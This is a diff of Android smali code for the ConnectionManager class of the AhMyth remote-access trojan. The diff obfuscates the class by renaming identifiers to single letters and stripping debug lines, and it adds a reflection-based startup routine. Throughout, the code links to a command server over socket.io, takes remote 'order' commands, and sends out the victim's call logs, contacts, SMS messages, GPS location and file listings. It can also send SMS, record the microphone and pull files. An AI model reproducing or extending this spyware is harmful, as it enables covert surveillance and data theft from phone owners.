@@ -1,26 +1,25 @@
 .class public Lahmyth/mine/king/ahmyth/ConnectionManager;
 .super Ljava/lang/Object;
-.source "ConnectionManager.java"
+.source ""
 
 
 # static fields
-.field public static context:Landroid/content/Context;
+.field public static a:Landroid/content/Context;
 
-.field private static fm:Lahmyth/mine/king/ahmyth/FileManager;
+.field private static b:Lb/a/b/e;
 
-.field private static ioSocket:Lio/socket/client/Socket;
+.field private static c:Lahmyth/mine/king/ahmyth/d;
 
 
 # direct methods
 .method static constructor <clinit>()V
     .locals 1
 
-    .line 21
-    new-instance v0, Lahmyth/mine/king/ahmyth/FileManager;
+    new-instance v0, Lahmyth/mine/king/ahmyth/d;
 
-    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/FileManager;-><init>()V
+    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/d;-><init>()V
 
-    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->fm:Lahmyth/mine/king/ahmyth/FileManager;
+    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->c:Lahmyth/mine/king/ahmyth/d;
 
     return-void
 .end method
@@ -28,68 +27,117 @@
 .method public constructor <init>()V
     .locals 0
 
-    .line 16
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
     return-void
 .end method
 
-.method static synthetic access$000()Lio/socket/client/Socket;
+.method static synthetic a()Lb/a/b/e;
     .locals 1
 
-    .line 16
-    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     return-object v0
+.end method
+
+.method private static b()V
+    .locals 3
+
+    :try_start_0
+    const-string v0, "android.app.ActivityThread"
+
+    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+
+    move-result-object v0
+    :try_end_0
+    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
+
+    const/4 v1, 0x0
+
+    new-array v1, v1, [Ljava/lang/Class;
+
+    const-string v2, "currentApplication"
+
+    invoke-virtual {v0, v2, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
+
+    move-result-object v0
+
+    const/4 v1, 0x0
+
+    invoke-virtual {v0, v1, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
+
+    move-result-object v1
+
+    check-cast v1, Landroid/content/Context;
+
+    if-nez v1, :cond_0
+
+    new-instance v1, Landroid/os/Handler;
+
+    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
+
+    move-result-object v2
+
+    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
+
+    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$a;
+
+    invoke-direct {v2, v0}, Lahmyth/mine/king/ahmyth/ConnectionManager$a;-><init>(Ljava/lang/reflect/Method;)V
+
+    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
+
+    goto :goto_0
+
+    :cond_0
+    invoke-static {v1}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V
+
+    :catch_0
+    :goto_0
+    return-void
 .end method
 
 .method public static sendReq()V
     .locals 3
 
-    .line 42
     :try_start_0
-    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     if-eqz v0, :cond_0
 
     return-void
 
-    .line 45
     :cond_0
-    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getInstance()Lahmyth/mine/king/ahmyth/IOSocket;
+    invoke-static {}, Lahmyth/mine/king/ahmyth/e;->a()Lahmyth/mine/king/ahmyth/e;
 
     move-result-object v0
 
-    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/e;->b()Lb/a/b/e;
 
     move-result-object v0
 
-    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     const-string v1, "ping"
 
-    .line 48
-    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$1;
+    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$b;
 
-    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$1;-><init>()V
+    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$b;-><init>()V
 
-    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;
+    invoke-virtual {v0, v1, v2}, Lb/a/c/a;->e(Ljava/lang/String;Lb/a/c/a$a;)Lb/a/c/a;
 
-    .line 55
-    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     const-string v1, "order"
 
-    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$2;
+    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$c;
 
-    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$2;-><init>()V
+    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$c;-><init>()V
 
-    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;
+    invoke-virtual {v0, v1, v2}, Lb/a/c/a;->e(Ljava/lang/String;Lb/a/c/a$a;)Lb/a/c/a;
 
-    .line 106
-    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
-    invoke-virtual {v0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
+    invoke-virtual {v0}, Lb/a/b/e;->w()Lb/a/b/e;
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -98,7 +146,6 @@
     :catch_0
     move-exception v0
 
-    .line 110
     invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
 
     move-result-object v0
@@ -114,22 +161,31 @@
 .method public static startAsync(Landroid/content/Context;)V
     .locals 0
 
-    .line 26
     :try_start_0
-    sput-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;
+    sput-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;
 
-    .line 27
     invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->sendReq()V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
     goto :goto_0
 
-    .line 29
     :catch_0
     invoke-static {p0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V
 
     :goto_0
+    return-void
+.end method
+
+.method public static startContext()V
+    .locals 0
+
+    :try_start_0
+    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->b()V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    :catch_0
     return-void
 .end method
 
@@ -144,21 +200,19 @@
 
     if-ne p0, v2, :cond_0
 
-    .line 119
-    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;
+    new-instance p0, Lahmyth/mine/king/ahmyth/b;
 
-    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;
 
-    invoke-direct {p0, v2}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V
+    invoke-direct {p0, v2}, Lahmyth/mine/king/ahmyth/b;-><init>(Landroid/content/Context;)V
 
-    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/CameraManager;->findCameraList()Lorg/json/JSONObject;
+    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/b;->c()Lorg/json/JSONObject;
 
     move-result-object p0
 
     if-eqz p0, :cond_2
 
-    .line 121
-    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     new-array v1, v1, [Ljava/lang/Object;
 
@@ -166,35 +220,33 @@
 
     const-string p0, "x0000ca"
 
-    invoke-virtual {v2, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
+    invoke-virtual {v2, p0, v1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
 
     goto :goto_0
 
     :cond_0
     if-ne p0, v1, :cond_1
 
-    .line 124
-    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;
+    new-instance p0, Lahmyth/mine/king/ahmyth/b;
 
-    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;
 
-    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V
+    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/b;-><init>(Landroid/content/Context;)V
 
-    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V
+    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/b;->f(I)V
 
     goto :goto_0
 
     :cond_1
     if-nez p0, :cond_2
 
-    .line 127
-    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;
+    new-instance p0, Lahmyth/mine/king/ahmyth/b;
 
-    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;
 
-    invoke-direct {p0, v1}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V
+    invoke-direct {p0, v1}, Lahmyth/mine/king/ahmyth/b;-><init>(Landroid/content/Context;)V
 
-    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V
+    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/b;->f(I)V
 
     :cond_2
     :goto_0
@@ -204,14 +256,13 @@
 .method public static x0000cl()V
     .locals 4
 
-    .line 150
-    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     const/4 v1, 0x1
 
     new-array v1, v1, [Ljava/lang/Object;
 
-    invoke-static {}, Lahmyth/mine/king/ahmyth/CallsManager;->getCallsLogs()Lorg/json/JSONObject;
+    invoke-static {}, Lahmyth/mine/king/ahmyth/a;->a()Lorg/json/JSONObject;
 
     move-result-object v2
 
@@ -221,7 +272,7 @@
 
     const-string v2, "x0000cl"
 
-    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
+    invoke-virtual {v0, v2, v1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
 
     return-void
 .end method
@@ -229,14 +280,13 @@
 .method public static x0000cn()V
     .locals 4
 
-    .line 154
-    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     const/4 v1, 0x1
 
     new-array v1, v1, [Ljava/lang/Object;
 
-    invoke-static {}, Lahmyth/mine/king/ahmyth/ContactsManager;->getContacts()Lorg/json/JSONObject;
+    invoke-static {}, Lahmyth/mine/king/ahmyth/c;->a()Lorg/json/JSONObject;
 
     move-result-object v2
 
@@ -246,7 +296,7 @@
 
     const-string v2, "x0000cn"
 
-    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
+    invoke-virtual {v0, v2, v1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
 
     return-void
 .end method
@@ -258,14 +308,13 @@
 
     if-nez p0, :cond_0
 
-    .line 134
-    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     new-array v0, v0, [Ljava/lang/Object;
 
     const/4 v1, 0x0
 
-    invoke-static {p1}, Lahmyth/mine/king/ahmyth/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;
+    invoke-static {p1}, Lahmyth/mine/king/ahmyth/d;->b(Ljava/lang/String;)Lorg/json/JSONArray;
 
     move-result-object p1
 
@@ -273,15 +322,14 @@
 
     const-string p1, "x0000fm"
 
-    invoke-virtual {p0, p1, v0}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
+    invoke-virtual {p0, p1, v0}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
 
     goto :goto_0
 
     :cond_0
     if-ne p0, v0, :cond_1
 
-    .line 136
-    invoke-static {p1}, Lahmyth/mine/king/ahmyth/FileManager;->downloadFile(Ljava/lang/String;)V
+    invoke-static {p1}, Lahmyth/mine/king/ahmyth/d;->a(Ljava/lang/String;)V
 
     :cond_1
     :goto_0
@@ -290,29 +338,20 @@
 
 .method public static x0000lm()V
     .locals 10
-    .annotation system Ldalvik/annotation/Throws;
-        value = {
-            Ljava/lang/Exception;
-        }
-    .end annotation
 
-    .line 162
     invoke-static {}, Landroid/os/Looper;->prepare()V
 
-    .line 163
-    new-instance v0, Lahmyth/mine/king/ahmyth/LocManager;
+    new-instance v0, Lahmyth/mine/king/ahmyth/f;
 
-    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;
 
-    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/LocManager;-><init>(Landroid/content/Context;)V
+    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/f;-><init>(Landroid/content/Context;)V
 
-    .line 164
     new-instance v1, Lorg/json/JSONObject;
 
     invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V
 
-    .line 166
-    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->canGetLocation()Z
+    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/f;->a()Z
 
     move-result v2
 
@@ -324,34 +363,25 @@
 
     if-eqz v2, :cond_0
 
-    .line 168
-    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->getLatitude()D
+    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/f;->b()D
 
     move-result-wide v6
 
-    .line 169
-    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->getLongitude()D
+    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/f;->d()D
 
     move-result-wide v8
 
-    .line 170
     new-instance v0, Ljava/lang/StringBuilder;
 
     invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
 
     invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;
 
-    move-result-object v0
-
     const-string v2, "   ,  "
 
     invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v0
-
     invoke-virtual {v0, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;
-
-    move-result-object v0
 
     invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
 
@@ -361,28 +391,23 @@
 
     invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 171
     invoke-virtual {v1, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
 
     const-string v0, "lat"
 
-    .line 172
     invoke-virtual {v1, v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
 
     const-string v0, "lng"
 
-    .line 173
     invoke-virtual {v1, v0, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
 
     goto :goto_0
 
-    .line 176
     :cond_0
     invoke-virtual {v1, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
 
-    .line 178
     :goto_0
-    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     new-array v2, v3, [Ljava/lang/Object;
 
@@ -390,21 +415,15 @@
 
     const-string v1, "x0000lm"
 
-    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
+    invoke-virtual {v0, v1, v2}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
 
     return-void
 .end method
 
 .method public static x0000mc(I)V
     .locals 0
-    .annotation system Ldalvik/annotation/Throws;
-        value = {
-            Ljava/lang/Exception;
-        }
-    .end annotation
 
-    .line 158
-    invoke-static {p0}, Lahmyth/mine/king/ahmyth/MicManager;->startRecording(I)V
+    invoke-static {p0}, Lahmyth/mine/king/ahmyth/g;->c(I)V
 
     return-void
 .end method
@@ -420,31 +439,28 @@
 
     if-nez p0, :cond_0
 
-    .line 142
-    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     new-array p1, v2, [Ljava/lang/Object;
 
-    invoke-static {}, Lahmyth/mine/king/ahmyth/SMSManager;->getSMSList()Lorg/json/JSONObject;
+    invoke-static {}, Lahmyth/mine/king/ahmyth/h;->a()Lorg/json/JSONObject;
 
     move-result-object p2
 
     aput-object p2, p1, v0
 
-    invoke-virtual {p0, v1, p1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
+    invoke-virtual {p0, v1, p1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
 
     goto :goto_0
 
     :cond_0
     if-ne p0, v2, :cond_1
 
-    .line 144
-    invoke-static {p1, p2}, Lahmyth/mine/king/ahmyth/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z
+    invoke-static {p1, p2}, Lahmyth/mine/king/ahmyth/h;->b(Ljava/lang/String;Ljava/lang/String;)Z
 
     move-result p0
 
-    .line 145
-    sget-object p1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object p1, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
 
     new-array p2, v2, [Ljava/lang/Object;
 
@@ -454,7 +470,7 @@
 
     aput-object p0, p2, v0
 
-    invoke-virtual {p1, v1, p2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
+    invoke-virtual {p1, v1, p2}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
 
     :cond_1
     :goto_0
